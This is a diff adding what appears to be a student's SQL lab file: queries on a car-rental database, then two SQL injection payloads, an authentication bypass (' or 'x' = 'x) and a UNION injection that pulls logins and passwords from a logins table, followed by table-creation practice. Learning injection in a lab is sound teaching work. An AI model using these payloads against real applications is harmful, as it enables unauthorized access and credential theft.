@@ -1,0 +1,35 @@
+Q1
+select classid,prix from cat order by prix;
+Q2
+select * from loc,veh where veh.carNum=loc.carNum and veh.classid='E';
+Q3
+select carnum from veh minus select carnum from loc;
+Q4
+select veh.classid,count(distinct(loc.NumCom)) from loc,veh where veh.carNum=loc.carNum group by veh.classid;
+Q5
+
+injection_1
+login = ' or 'x' = 'x
+pwd = ' or 'x' = 'x
+
+injection_2
+A' Union select logins.login, logins.mot from logins where 'y' = 'y
+------------------------------------------------------------------------
+ignore below!!!!!!!!!!!!!!!!!!!
+------------------------------------------------------------------------
+
+select distinct veh.carnum, veh.classid from veh where veh.classid='A' Union select logins.login, logins.mot from logins where 'y' = 'y';
+
+A' Union select logins.login, logins.mot from logins where 'y' = 'y
+select distinct veh.carnum, veh.classid from veh WHERE classid='A' Union select logins.login, logins.mot from logins where 'y' = 'y';
+
+test part
+create table test(time date)
+alter table test rename column time to timeBeg;
+alter table test add(timeEnd date);
+alter table test add(name char(10));
+insert into test values('12-jan-2018','18-jan-2018','liming');
+insert into test values('19-jan-2018','21-jan-2018','laowang');
+insert into test values('22-jan-2018','24-jan-2018','lisi');
+select name from test where timebeg between '11-jan-2018' and '14-jan-2018';
+
